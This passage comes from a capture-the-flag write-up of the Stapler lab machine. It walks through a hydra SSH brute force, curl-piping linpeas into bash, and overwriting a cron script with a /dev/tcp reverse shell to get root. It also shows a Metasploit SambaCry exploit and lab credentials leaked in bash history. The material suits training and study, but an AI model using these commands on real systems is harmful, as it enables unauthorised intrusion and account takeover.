|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://Stapler:12380
 🚀  Threads               │ 100
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/big.txt
 💢  Status Code Filters   │ [400]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💾  Output File           │ ferox_12380.txt
 💲  Extensions            │ [txt, html, php]
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 📍  Follow Redirects      │ true
 🚫  Do Not Recurse        │ true
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
400      GET      935l     2457w   434538c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
[####################] - 72m    81908/81908   0s      found:0       errors:118
[####################] - 72m    81908/81908   19/s    http://Stapler:12380/ 
```

# Initial Access


## Shell as SHayslett


### Password bruteforce

Extract usernames gathered from **enum4linux**

```bash
┌──(bravosec㉿fsociety)-[~/pgplay/Stapler]
└─$ cat users.txt | awk '{print $3}' | awk -F'\' '{print $2}' | tee users.lst
peter
RNunemaker
ETollefson
DSwanger
AParnell
SHayslett
MBassin
JBare
LSolum
IChadwick
MFrei
SStroud
CCeaser
JKanode
CJoo
Eeth
LSolum2
JLipps
jamie
Sam
Drew
jess
SHAY
Taylor
mel
kai
zoe
NATHAN
www
elly
```

Brute force `null` password, `username` as password, `reverse string` of username as password

```bash
┌──(bravosec㉿fsociety)-[~/pgplay/Stapler]
└─$ hydra -e nsr -L users.lst ssh://stapler -t 16
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-01-08 21:08:49
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 90 login tries (l:30/p:3), ~6 tries per task
[DATA] attacking ssh://stapler:22/
[22][ssh] host: stapler   login: SHayslett   password: SHayslett
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-01-08 21:09:51
```

```bash
┌──(bravosec㉿fsociety)-[~/pgplay/Stapler]
└─$ cssh SHayslett@stapler 'SHayslett'
Warning: Permanently added 'stapler' (ED25519) to the list of known hosts.
-----------------------------------------------------------------
~          Barry, don't forget to put a message here           ~
-----------------------------------------------------------------
Welcome back!


SHayslett@red:~$ id
uid=1005(SHayslett) gid=1005(SHayslett) groups=1005(SHayslett)
```

# Privilege Escalation


## From SHayslett to root


### Writable logrotate script

```bash
SHayslett@red:~$ curl 192.168.45.172/linpeas.sh|bash
```

![](/assets/obsidian/f4cb0bc6bb2c154a539de8657cb3dd2f.png)

```bash
SHayslett@red:~$ ls -la /usr/local/sbin/cron-logrotate.sh
-rwxrwxrwx 1 root root 51 Jun  3  2016 /usr/local/sbin/cron-logrotate.sh
SHayslett@red:~$ cat /usr/local/sbin/cron-logrotate.sh

#Simon, you really need to-do something about this
SHayslett@red:~$ echo '/bin/bash -c "bash -i >& /dev/tcp/192.168.45.172/1111 0>&1"' > /usr/local/sbin/cron-logrotate.sh
```

```bash
┌──(bravosec㉿fsociety)-[~/pgplay/Stapler]
└─$ nc -lvnp 1111
listening on [any] 1111 ...
connect to [192.168.45.172] from (UNKNOWN) [192.168.227.148] 47310
bash: cannot set terminal process group (27622): Inappropriate ioctl for device
bash: no job control in this shell
root@red:~# id
id
uid=0(root) gid=0(root) groups=0(root)
root@red:~#
```

# Post Exploitation


## System Proof Screenshot

![](/assets/obsidian/82cb1a6dda745904c8e8402284a502b6.png)


## TFTP config

```bash
cat /etc/default/atftpd
USE_INETD=false
OPTIONS="--tftpd-timeout 300 --retry-timeout 5 --mcast-port 1758 --mcast-addr 239.239.239.0-255 --mcast-ttl 1 --maxthread 100 --verbose=5 /home/www"
```

# Appendix


## SambaCry RCE exploit for Samba 4.5.9 (Metasploit)

- `/tmp` share on SMB is writeable

```bash
sudo msfdb start && sudo msfconsole -q
use linux/samba/is_known_pipename
set RHOST stapler
set RPORT 139
exploit
```

```bash
[*] 192.168.216.148:139 - Using location \\192.168.216.148\tmp\ for the path
[*] 192.168.216.148:139 - Retrieving the remote path of the share 'tmp'
[*] 192.168.216.148:139 - Share 'tmp' has server-side path '/var/tmp
[*] 192.168.216.148:139 - Uploaded payload to \\192.168.216.148\tmp\BmFYecGx.so
[*] 192.168.216.148:139 - Loading the payload from server-side path /var/tmp/BmFYecGx.so using \\PIPE\/var/tmp/BmFYecGx.so...
[-] 192.168.216.148:139 -   >> Failed to load STATUS_OBJECT_NAME_NOT_FOUND
[*] 192.168.216.148:139 - Loading the payload from server-side path /var/tmp/BmFYecGx.so using /var/tmp/BmFYecGx.so...
[-] 192.168.216.148:139 -   >> Failed to load STATUS_OBJECT_NAME_NOT_FOUND
[*] 192.168.216.148:139 - Uploaded payload to \\192.168.216.148\tmp\TiXikXFU.so
[*] 192.168.216.148:139 - Loading the payload from server-side path /var/tmp/TiXikXFU.so using \\PIPE\/var/tmp/TiXikXFU.so...
[-] 192.168.216.148:139 -   >> Failed to load STATUS_OBJECT_NAME_NOT_FOUND
[*] 192.168.216.148:139 - Loading the payload from server-side path /var/tmp/TiXikXFU.so using /var/tmp/TiXikXFU.so...
[+] 192.168.216.148:139 - Probe response indicates the interactive payload was loaded...
[*] Found shell.
[*] Command shell session 1 opened (192.168.45.184:33831 -> 192.168.216.148:139) at 2024-01-10 12:41:25 +0800

id
uid=0(root) gid=0(root) groups=0(root)
```

## Privesc - From peter to root


### JKanode and peter's credential leaked in bash history

```bash
SHayslett@red:~$ ls -la
total 24
drwxr-xr-x  3 SHayslett SHayslett 4096 Jan  8 12:34 .
drwxr-xr-x 32 root      root      4096 Jun  9  2021 ..
lrwxrwxrwx  1 root      root         9 May  5  2021 .bash_history -> /dev/null
-rw-r--r--  1 SHayslett SHayslett  220 Sep  1  2015 .bash_logout
-rw-r--r--  1 SHayslett SHayslett 3771 Sep  1  2015 .bashrc
drwx------  2 SHayslett SHayslett 4096 Jan  8 12:34 .cache
-rw-r--r--  1 SHayslett SHayslett  675 Sep  1  2015 .profile
```

```bash
SHayslett@red:~$ find /home -readable -ls
    77202      4 drwxr-xr-x  32 root     root         4096 Jun  9  2021 /home
    85885      4 drwxr-xr-x   2 MFrei    MFrei        4096 May  5  2021 /home/MFrei
    85886      4 -rw-r--r--   1 MFrei    MFrei        3771 Sep  1  2015 /home/MFrei/.bashrc
    10425      0 lrwxrwxrwx   1 root     root            9 May  5  2021 /home/MFrei/.bash_history -> /dev/null
    85887      4 -rw-r--r--   1 MFrei    MFrei         220 Sep  1  2015 /home/MFrei/.bash_logout
    85888      4 -rw-r--r--   1 MFrei    MFrei         675 Sep  1  2015 /home/MFrei/.profile
    85921      4 drwxr-xr-x   2 Sam      Sam          4096 Jun  5  2016 /home/Sam
    85922      4 -rw-r--r--   1 Sam      Sam          3771 Sep  1  2015 /home/Sam/.bashrc
    86307      4 -rw-r--r--   1 root     root            5 Jun  5  2016 /home/Sam/.bash_history
    85923      4 -rw-r--r--   1 Sam      Sam           220 Sep  1  2015 /home/Sam/.bash_logout
    85924      4 -rw-r--r--   1 Sam      Sam           675 Sep  1  2015 /home/Sam/.profile
    85893      4 drwxr-xr-x   2 CCeaser  CCeaser      4096 Jun  5  2016 /home/CCeaser
    85894      4 -rw-r--r--   1 CCeaser  CCeaser      3771 Sep  1  2015 /home/CCeaser/.bashrc
    86311      4 -rw-r--r--   1 root     root           10 Jun  5  2016 /home/CCeaser/.bash_history
    85895      4 -rw-r--r--   1 CCeaser  CCeaser       220 Sep  1  2015 /home/CCeaser/.bash_logout
    85896      4 -rw-r--r--   1 CCeaser  CCeaser       675 Sep  1  2015 /home/CCeaser/.profile
    89560      4 drwxrwxrwx   2 www      www          4096 Jun  5  2016 /home/www
    89701      4 -rw-r--r--   1 www      www          3771 Sep  1  2015 /home/www/.bashrc
    96969      4 -rw-r--r--   1 www      www           220 Sep  1  2015 /home/www/.bash_logout
    96978      4 -rw-r--r--   1 www      www           675 Sep  1  2015 /home/www/.profile
    85857      4 drwxr-xr-x   2 DSwanger DSwanger     4096 May  5  2021 /home/DSwanger
    85858      4 -rw-r--r--   1 DSwanger DSwanger     3771 Sep  1  2015 /home/DSwanger/.bashrc
    10411      0 lrwxrwxrwx   1 root     root            9 May  5  2021 /home/DSwanger/.bash_history -> /dev/null
    85859      4 -rw-r--r--   1 DSwanger DSwanger      220 Sep  1  2015 /home/DSwanger/.bash_logout
    85860      4 -rw-r--r--   1 DSwanger DSwanger      675 Sep  1  2015 /home/DSwanger/.profile
    85873      4 drwxr-xr-x   2 JBare    JBare        4096 May  5  2021 /home/JBare
    85874      4 -rw-r--r--   1 JBare    JBare        3771 Sep  1  2015 /home/JBare/.bashrc
    10421      0 lrwxrwxrwx   1 root     root            9 May  5  2021 /home/JBare/.bash_history -> /dev/null
    85875      4 -rw-r--r--   1 JBare    JBare         220 Sep  1  2015 /home/JBare/.bash_logout
    85876      4 -rw-r--r--   1 JBare    JBare         675 Sep  1  2015 /home/JBare/.profile
    85941      4 drwxr-xr-x   2 mel      mel          4096 May  5  2021 /home/mel
    85942      4 -rw-r--r--   1 mel      mel          3771 Sep  1  2015 /home/mel/.bashrc
    13560      0 lrwxrwxrwx   1 root     root            9 May  5  2021 /home/mel/.bash_history -> /dev/null
    85943      4 -rw-r--r--   1 mel      mel           220 Sep  1  2015 /home/mel/.bash_logout
    85944      4 -rw-r--r--   1 mel      mel           675 Sep  1  2015 /home/mel/.profile
    85929      4 drwxr-xr-x   2 jess     jess         4096 May  5  2021 /home/jess
    85930      4 -rw-r--r--   1 jess     jess         3771 Sep  1  2015 /home/jess/.bashrc
    13548      0 lrwxrwxrwx   1 root     root            9 May  5  2021 /home/jess/.bash_history -> /dev/null
    85931      4 -rw-r--r--   1 jess     jess          220 Sep  1  2015 /home/jess/.bash_logout
    85932      4 -rw-r--r--   1 jess     jess          675 Sep  1  2015 /home/jess/.profile
    85869      4 drwxr-xr-x   2 MBassin  MBassin      4096 May  5  2021 /home/MBassin
    85870      4 -rw-r--r--   1 MBassin  MBassin      3771 Sep  1  2015 /home/MBassin/.bashrc
    10420      0 lrwxrwxrwx   1 root     root            9 May  5  2021 /home/MBassin/.bash_history -> /dev/null
    85871      4 -rw-r--r--   1 MBassin  MBassin       220 Sep  1  2015 /home/MBassin/.bash_logout
    85872      4 -rw-r--r--   1 MBassin  MBassin       675 Sep  1  2015 /home/MBassin/.profile
    85945      4 drwxr-xr-x   2 kai      kai          4096 May  5  2021 /home/kai
    85946      4 -rw-r--r--   1 kai      kai          3771 Sep  1  2015 /home/kai/.bashrc
    13561      0 lrwxrwxrwx   1 root     root            9 May  5  2021 /home/kai/.bash_history -> /dev/null
    85947      4 -rw-r--r--   1 kai      kai           220 Sep  1  2015 /home/kai/.bash_logout
    85948      4 -rw-r--r--   1 kai      kai           675 Sep  1  2015 /home/kai/.profile
    86288      4 drwxr-xr-x   2 elly     elly         4096 May  5  2021 /home/elly
    86289      4 -rw-r--r--   1 elly     elly         3771 Sep  1  2015 /home/elly/.bashrc
    13567      0 lrwxrwxrwx   1 root     root            9 May  5  2021 /home/elly/.bash_history -> /dev/null
    86290      4 -rw-r--r--   1 elly     elly          220 Sep  1  2015 /home/elly/.bash_logout
    86291      4 -rw-r--r--   1 elly     elly          675 Sep  1  2015 /home/elly/.profile
    85925      4 drwxr-xr-x   2 Drew     Drew         4096 May  5  2021 /home/Drew
    85926      4 -rw-r--r--   1 Drew     Drew         3771 Sep  1  2015 /home/Drew/.bashrc
    13544      0 lrwxrwxrwx   1 root     root            9 May  5  2021 /home/Drew/.bash_history -> /dev/null
    85927      4 -rw-r--r--   1 Drew     Drew          220 Sep  1  2015 /home/Drew/.bash_logout
    85928      4 -rw-r--r--   1 Drew     Drew          675 Sep  1  2015 /home/Drew/.profile
    85913      4 drwxr-xr-x   2 JLipps   JLipps       4096 May  5  2021 /home/JLipps
    85914      4 -rw-r--r--   1 JLipps   JLipps       3771 Sep  1  2015 /home/JLipps/.bashrc
    13535      0 lrwxrwxrwx   1 root     root            9 May  5  2021 /home/JLipps/.bash_history -> /dev/null
    85915      4 -rw-r--r--   1 JLipps   JLipps        220 Sep  1  2015 /home/JLipps/.bash_logout
    85916      4 -rw-r--r--   1 JLipps   JLipps        675 Sep  1  2015 /home/JLipps/.profile
    85917      4 drwxr-xr-x   2 jamie    jamie        4096 May  5  2021 /home/jamie
    85918      4 -rw-r--r--   1 jamie    jamie        3771 Sep  1  2015 /home/jamie/.bashrc
    13543      0 lrwxrwxrwx   1 root     root            9 May  5  2021 /home/jamie/.bash_history -> /dev/null
    85919      4 -rw-r--r--   1 jamie    jamie         220 Sep  1  2015 /home/jamie/.bash_logout
    85920      4 -rw-r--r--   1 jamie    jamie         675 Sep  1  2015 /home/jamie/.profile
    85937      4 drwxr-xr-x   2 Taylor   Taylor       4096 May  5  2021 /home/Taylor
    85938      4 -rw-r--r--   1 Taylor   Taylor       3771 Sep  1  2015 /home/Taylor/.bashrc
    13557      0 lrwxrwxrwx   1 root     root            9 May  5  2021 /home/Taylor/.bash_history -> /dev/null
    85939      4 -rw-r--r--   1 Taylor   Taylor        220 Sep  1  2015 /home/Taylor/.bash_logout
    85940      4 -rw-r--r--   1 Taylor   Taylor        675 Sep  1  2015 /home/Taylor/.profile
    96963      4 drwxr-xr-x   3 peter    peter        4096 Jun  9  2021 /home/peter
    96964      4 -rw-r--r--   1 peter    peter        3771 Jun  3  2016 /home/peter/.bashrc
find: ‘/home/peter/.cache’: Permission denied
    10407      0 -rw-r--r--   1 peter    peter           0 Jun  9  2021 /home/peter/.zshrc
    96965      4 -rw-r--r--   1 peter    peter         220 Jun  3  2016 /home/peter/.bash_logout
    96967      0 -rw-r--r--   1 peter    peter           0 Jun  3  2016 /home/peter/.sudo_as_admin_successful
    96966      4 -rw-r--r--   1 peter    peter         675 Jun  3  2016 /home/peter/.profile
    85865      4 drwxr-xr-x   3 SHayslett SHayslett     4096 Jan  8 12:34 /home/SHayslett
    85866      4 -rw-r--r--   1 SHayslett SHayslett     3771 Sep  1  2015 /home/SHayslett/.bashrc
    10417      0 lrwxrwxrwx   1 root      root             9 May  5  2021 /home/SHayslett/.bash_history -> /dev/null
   262244      4 drwx------   2 SHayslett SHayslett     4096 Jan  8 12:34 /home/SHayslett/.cache
   262245      0 -rw-r--r--   1 SHayslett SHayslett        0 Jan  8 12:34 /home/SHayslett/.cache/motd.legal-displayed
    85867      4 -rw-r--r--   1 SHayslett SHayslett      220 Sep  1  2015 /home/SHayslett/.bash_logout
    85868      4 -rw-r--r--   1 SHayslett SHayslett      675 Sep  1  2015 /home/SHayslett/.profile
    85897      4 drwxr-xr-x   2 JKanode   JKanode       4096 Jun  9  2021 /home/JKanode
    85898      4 -rw-r--r--   1 JKanode   JKanode       3771 Sep  1  2015 /home/JKanode/.bashrc
    13522      4 -r--r--r--   1 JKanode   JKanode        171 Jun  9  2021 /home/JKanode/.bash_history
    85899      4 -rw-r--r--   1 JKanode   JKanode        220 Sep  1  2015 /home/JKanode/.bash_logout
    85900      4 -rw-r--r--   1 JKanode   JKanode        675 Sep  1  2015 /home/JKanode/.profile
    85861      4 drwxr-xr-x   2 AParnell  AParnell      4096 May  5  2021 /home/AParnell
    85862      4 -rw-r--r--   1 AParnell  AParnell      3771 Sep  1  2015 /home/AParnell/.bashrc
    10412      0 lrwxrwxrwx   1 root      root             9 May  5  2021 /home/AParnell/.bash_history -> /dev/null
    85863      4 -rw-r--r--   1 AParnell  AParnell       220 Sep  1  2015 /home/AParnell/.bash_logout
    85864      4 -rw-r--r--   1 AParnell  AParnell       675 Sep  1  2015 /home/AParnell/.profile
    85901      4 drwxr-xr-x   2 CJoo      CJoo          4096 May  5  2021 /home/CJoo
    85902      4 -rw-r--r--   1 CJoo      CJoo          3771 Sep  1  2015 /home/CJoo/.bashrc
    13523      0 lrwxrwxrwx   1 root      root             9 May  5  2021 /home/CJoo/.bash_history -> /dev/null
    85903      4 -rw-r--r--   1 CJoo      CJoo           220 Sep  1  2015 /home/CJoo/.bash_logout
    85904      4 -rw-r--r--   1 CJoo      CJoo           675 Sep  1  2015 /home/CJoo/.profile
    85905      4 drwxr-xr-x   2 Eeth      Eeth          4096 Jun  5  2016 /home/Eeth
    85906      4 -rw-r--r--   1 Eeth      Eeth          3771 Sep  1  2015 /home/Eeth/.bashrc
    86287      4 -rw-r--r--   1 root      root             5 Jun  5  2016 /home/Eeth/.bash_history
    85907      4 -rw-r--r--   1 Eeth      Eeth           220 Sep  1  2015 /home/Eeth/.bash_logout
    85908      4 -rw-r--r--   1 Eeth      Eeth           675 Sep  1  2015 /home/Eeth/.profile
    13704      4 -r--r--r--   1 www-data  www-data        33 Jan  8 11:47 /home/local.txt
    85849      4 drwxr-xr-x   2 RNunemaker RNunemaker     4096 May  5  2021 /home/RNunemaker
    85850      4 -rw-r--r--   1 RNunemaker RNunemaker     3771 Sep  1  2015 /home/RNunemaker/.bashrc
    10405      0 lrwxrwxrwx   1 root       root              9 May  5  2021 /home/RNunemaker/.bash_history -> /dev/null
    85851      4 -rw-r--r--   1 RNunemaker RNunemaker      220 Sep  1  2015 /home/RNunemaker/.bash_logout
    85852      4 -rw-r--r--   1 RNunemaker RNunemaker      675 Sep  1  2015 /home/RNunemaker/.profile
    85933      4 drwxr-xr-x   2 SHAY       SHAY           4096 May  5  2021 /home/SHAY
    85934      4 -rw-r--r--   1 SHAY       SHAY           3771 Sep  1  2015 /home/SHAY/.bashrc
    13555      0 lrwxrwxrwx   1 root       root              9 May  5  2021 /home/SHAY/.bash_history -> /dev/null
    85935      4 -rw-r--r--   1 SHAY       SHAY            220 Sep  1  2015 /home/SHAY/.bash_logout
    85936      4 -rw-r--r--   1 SHAY       SHAY            675 Sep  1  2015 /home/SHAY/.profile
    85853      4 drwxr-xr-x   2 ETollefson ETollefson     4096 May  5  2021 /home/ETollefson
    85854      4 -rw-r--r--   1 ETollefson ETollefson     3771 Sep  1  2015 /home/ETollefson/.bashrc
    10410      0 lrwxrwxrwx   1 root       root              9 May  5  2021 /home/ETollefson/.bash_history -> /dev/null
    85855      4 -rw-r--r--   1 ETollefson ETollefson      220 Sep  1  2015 /home/ETollefson/.bash_logout
    85856      4 -rw-r--r--   1 ETollefson ETollefson      675 Sep  1  2015 /home/ETollefson/.profile
    85881      4 drwxr-xr-x   2 IChadwick  IChadwick      4096 Jun  5  2016 /home/IChadwick
    85882      4 -rw-r--r--   1 IChadwick  IChadwick      3771 Sep  1  2015 /home/IChadwick/.bashrc
    86294      4 -rw-r--r--   1 root       root              5 Jun  5  2016 /home/IChadwick/.bash_history
    85883      4 -rw-r--r--   1 IChadwick  IChadwick       220 Sep  1  2015 /home/IChadwick/.bash_logout
    85884      4 -rw-r--r--   1 IChadwick  IChadwick       675 Sep  1  2015 /home/IChadwick/.profile
    85909      4 drwxr-xr-x   2 LSolum2    LSolum2        4096 Jun  5  2016 /home/LSolum2
    85910      4 -rw-r--r--   1 LSolum2    LSolum2        3771 Sep  1  2015 /home/LSolum2/.bashrc
    86298      4 -rw-r--r--   1 root       root             12 Jun  5  2016 /home/LSolum2/.bash_history
    85911      4 -rw-r--r--   1 LSolum2    LSolum2         220 Sep  1  2015 /home/LSolum2/.bash_logout
    85912      4 -rw-r--r--   1 LSolum2    LSolum2         675 Sep  1  2015 /home/LSolum2/.profile
    85889      4 drwxr-xr-x   2 SStroud    SStroud        4096 May  5  2021 /home/SStroud
    85890      4 -rw-r--r--   1 SStroud    SStroud        3771 Sep  1  2015 /home/SStroud/.bashrc
    10426      0 lrwxrwxrwx   1 root       root              9 May  5  2021 /home/SStroud/.bash_history -> /dev/null
    85891      4 -rw-r--r--   1 SStroud    SStroud         220 Sep  1  2015 /home/SStroud/.bash_logout
    85892      4 -rw-r--r--   1 SStroud    SStroud         675 Sep  1  2015 /home/SStroud/.profile
    85877      4 drwxr-xr-x   2 LSolum     LSolum         4096 May  5  2021 /home/LSolum
    85878      4 -rw-r--r--   1 LSolum     LSolum         3771 Sep  1  2015 /home/LSolum/.bashrc
    10423      0 lrwxrwxrwx   1 root       root              9 May  5  2021 /home/LSolum/.bash_history -> /dev/null
    85879      4 -rw-r--r--   1 LSolum     LSolum          220 Sep  1  2015 /home/LSolum/.bash_logout
    85880      4 -rw-r--r--   1 LSolum     LSolum          675 Sep  1  2015 /home/LSolum/.profile
    85953      4 drwxr-xr-x   2 NATHAN     NATHAN         4096 May  5  2021 /home/NATHAN
    85954      4 -rw-r--r--   1 NATHAN     NATHAN         3771 Sep  1  2015 /home/NATHAN/.bashrc
    13566      0 lrwxrwxrwx   1 root       root              9 May  5  2021 /home/NATHAN/.bash_history -> /dev/null
    85955      4 -rw-r--r--   1 NATHAN     NATHAN          220 Sep  1  2015 /home/NATHAN/.bash_logout
    85956      4 -rw-r--r--   1 NATHAN     NATHAN          675 Sep  1  2015 /home/NATHAN/.profile
    85949      4 drwxr-xr-x   3 zoe        zoe            4096 May  5  2021 /home/zoe
    85950      4 -rw-r--r--   1 zoe        zoe            3771 Sep  1  2015 /home/zoe/.bashrc
    13562      0 lrwxrwxrwx   1 root       root              9 May  5  2021 /home/zoe/.bash_history -> /dev/null
find: ‘/home/zoe/.ssh’: Permission denied
    85951      4 -rw-r--r--   1 zoe        zoe             220 Sep  1  2015 /home/zoe/.bash_logout
    85952      4 -rw-r--r--   1 zoe        zoe             675 Sep  1  2015 /home/zoe/.profile
```

Some users have `bash_history` enabled

```bash
SHayslett@red:~$ find /home -type f -name .*_history -exec bash -c 'echo -e "---\n$0\n---"; cat $0' {} \;
---
/home/Sam/.bash_history
---
exit
---
/home/CCeaser/.bash_history
---
free
exit
---
/home/peter/.bash_history
---
cat: /home/peter/.bash_history: Permission denied
find: ‘/home/peter/.cache’: Permission denied
---
/home/JKanode/.bash_history
---
id
whoami
ls -lah
pwd
ps aux
sshpass -p thisimypassword ssh JKanode@localhost
apt-get install sshpass
sshpass -p JZQuyIN5 ssh peter@localhost
ps -ef
top
kill -9 3747
exit
---
/home/Eeth/.bash_history
---
exit
---
/home/IChadwick/.bash_history
---
exit
---
/home/LSolum2/.bash_history
---
exit
whoami
find: ‘/home/zoe/.ssh’: Permission denied
```

### Peter with sudo group

```bash
SHayslett@red:~$ su - peter
Password:

red% id
uid=1000(peter) gid=1000(peter) groups=1000(peter),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare)
red% sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for peter:
Matching Defaults entries for peter on red:
    lecture=always, env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User peter may run the following commands on red:
    (ALL : ALL) ALL
red% sudo su
➜  peter id
uid=0(root) gid=0(root) groups=0(root)
```


## Kill tasks from autorecon

Press `s` in **autorecon** will show the status

![](/assets/obsidian/3b5e12171d89fa00bee8ced731aa4f6f.png)

Kill the unwanted tasks with the PIDs shown

```bash
sudo kill $(echo "2951996, 2951999"|tr -d ',')
```

